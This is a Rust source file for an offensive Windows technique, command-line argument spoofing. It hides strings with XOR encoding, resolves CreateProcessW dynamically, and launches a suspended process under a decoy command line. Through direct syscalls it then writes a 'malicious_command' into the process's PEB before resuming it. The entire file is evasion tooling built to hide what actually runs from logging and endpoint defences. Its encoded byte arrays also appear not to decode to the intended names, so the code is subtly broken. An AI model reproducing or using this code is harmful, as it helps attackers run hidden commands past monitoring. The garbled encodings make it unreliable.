#![allow(non_snake_case)]
use std::mem::{size_of, zeroed, transmute};
use std::ptr::null_mut;

use dinvoke_rs::dinvoke;
use ntapi::ntpebteb::PEB;
use ntapi::ntpsapi::PROCESS_BASIC_INFORMATION;
use rust_syscalls::syscall;
use winapi::shared::minwindef::{BOOL, DWORD, LPVOID};
use winapi::shared::ntdef::{NTSTATUS, UNICODE_STRING};
use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
use winapi::um::processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOW};
use winapi::um::winbase::{CREATE_NEW_CONSOLE, CREATE_SUSPENDED};
use winapi::um::winnt::{LPCWSTR, LPWSTR};

fn xor_decrypt(data: &[u8], key: u8) -> String {
    String::from_utf8(data.iter().map(|&b| b ^ key).collect()).unwrap()
}

fn to_wide_chars(s: &str) -> Vec<u16> {
    s.encode_utf16().collect()
}

fn pad_right(s: &str, total_width: usize, padding_char: u16) -> Vec<u16> {
    let mut wide = to_wide_chars(s);
    if wide.len() < total_width {
        wide.resize(total_width, padding_char);
    }
    wide
}

fn main() {
    let key = 0x42;
    let malicious_command_encrypted = [50, 45, 53, 41, 48, 51, 46, 41, 44, 44, 2, 41, 57, 41, 2, 10, 41, 57, 41, 49, 55, 51, 44, 45, 52, 2, 63, 57, 48, 45, 49, 51, 2, 11, 2, 51, 41, 45, 56, 45, 40, 2, 51, 51, 2, 10, 49, 51, 51, 12, 11, 2, 15, 56, 45, 50, 2, 46, 45, 51, 41, 45, 49, 55, 41, 51, 51, 2, 44, 45, 51, 41, 48, 45, 49, 41, 51, 51, 2, 10, 48, 53, 41, 51, 41, 49, 2];
    let spoofed_command_str_encrypted = [50, 45, 53, 41, 48, 51, 46, 41, 44, 44, 2, 41, 57, 41];
    let current_dir_encrypted = [35, 28, 92, 53, 49, 46, 42, 45, 53, 51, 92];
    let kernel32_encrypted = [43, 41, 48, 46, 41, 44, 56, 50, 2, 42, 44, 44];
    let createprocessw_encrypted = [35, 48, 41, 45, 51, 41, 2, 50, 48, 45, 49, 41, 51, 51, 23];

    let malicious_command = xor_decrypt(&malicious_command_encrypted, key);
    let malicious_command_wide = to_wide_chars(&malicious_command);

    let spoofed_command_str = xor_decrypt(&spoofed_command_str_encrypted, key);
    let mut spoofed_command_wide = pad_right(&spoofed_command_str, malicious_command.len(), ' ' as u16);
    spoofed_command_wide.push(0);

    let mut si: STARTUPINFOW = unsafe { zeroed() };
    si.cb = size_of::<STARTUPINFOW>() as DWORD;
    let mut sa: SECURITY_ATTRIBUTES = unsafe { zeroed() };
    sa.nLength = size_of::<SECURITY_ATTRIBUTES>() as DWORD;
    let mut pi: PROCESS_INFORMATION = unsafe { zeroed() };

    let current_dir = xor_decrypt(&current_dir_encrypted, key);
    let mut current_dir_wide = to_wide_chars(&current_dir);
    current_dir_wide.push(0);

    let kernel32_str = xor_decrypt(&kernel32_encrypted, key);
    let createprocessw_str = xor_decrypt(&createprocessw_encrypted, key);

    let kernel32_handle = dinvoke::get_module_base_address(&kernel32_str);
    let create_process_addr = dinvoke::get_function_address(kernel32_handle, &createprocessw_str);

    type CreateProcessWFn = unsafe extern "system" fn(LPCWSTR, LPWSTR, *mut SECURITY_ATTRIBUTES, *mut SECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, *mut STARTUPINFOW, *mut PROCESS_INFORMATION) -> BOOL;
    let create_process: CreateProcessWFn = unsafe { transmute(create_process_addr) };

    let success = unsafe {
        create_process(
            null_mut(),
            spoofed_command_wide.as_mut_ptr() as LPWSTR,
            &mut sa,
            &mut sa,
            0,
            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
            null_mut(),
            current_dir_wide.as_ptr() as LPCWSTR,
            &mut si,
            &mut pi,
        )
    };

    if success == 0 {
        println!("CreateProcessW failed");
        return;
    }

    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { zeroed() };
    let mut return_length: u32 = 0;

    let mut status: NTSTATUS;
    unsafe {
        status = syscall!(
            "NtQueryInformationProcess",
            pi.hProcess,
            0,
            &mut pbi as *mut _ as LPVOID,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length
        );
    }

    if status != 0 {
        println!("NtQueryInformationProcess failed");
        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
        return;
    }

    let mut peb: PEB = unsafe { zeroed() };
    let mut bytes_read: usize = 0;

    unsafe {
        status = syscall!(
            "NtReadVirtualMemory",
            pi.hProcess,
            pbi.PebBaseAddress as LPVOID,
            &mut peb as *mut _ as LPVOID,
            size_of::<PEB>(),
            &mut bytes_read
        );
    }

    if status != 0 || bytes_read != size_of::<PEB>() {
        println!("NtReadVirtualMemory for PEB failed");
        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
        return;
    }

    #[repr(C)]
    struct Params {
        _filler: [u8; 0x70],
        CommandLine: UNICODE_STRING,
    }
    let mut proc_params: Params = unsafe { zeroed() };
    unsafe {
        status = syscall!(
            "NtReadVirtualMemory",
            pi.hProcess,
            peb.ProcessParameters as LPVOID,
            &mut proc_params as *mut _ as LPVOID,
            size_of::<Params>(),
            &mut bytes_read
        );
    }

    if status != 0 || bytes_read != size_of::<Params>() {
        println!("NtReadVirtualMemory for ProcessParameters failed");
        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
        return;
    }

    let mut bytes_written: usize = 0;
    unsafe {
        status = syscall!(
            "NtWriteVirtualMemory",
            pi.hProcess,
            proc_params.CommandLine.Buffer,
            malicious_command_wide.as_ptr() as LPVOID,
            malicious_command_wide.len() * 2,
            &mut bytes_written
        );
    }

    if status != 0 {
        println!("NtWriteVirtualMemory for command line failed");
        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
        return;
    }

    let cmd_line_len = (spoofed_command_str.len() * 2) as u16;

    unsafe {
        let len_address = (peb.ProcessParameters as *mut u8).add(0x70);
        status = syscall!(
            "NtWriteVirtualMemory",
            pi.hProcess,
            len_address as LPVOID,
            &cmd_line_len as *const _ as LPVOID,
            size_of::<u16>(),
            &mut bytes_written
        );
    }

    if status != 0 {
        println!("NtWriteVirtualMemory for command line length failed");
        unsafe { let _ = syscall!("NtClose", pi.hProcess); let _ = syscall!("NtClose", pi.hThread); }
        return;
    }

    unsafe {
        let mut suspend_count: u32 = 0;
        let _ = syscall!("NtResumeThread", pi.hThread, &mut suspend_count);
        let _ = syscall!("NtClose", pi.hProcess);
        let _ = syscall!("NtClose", pi.hThread);
    }
}
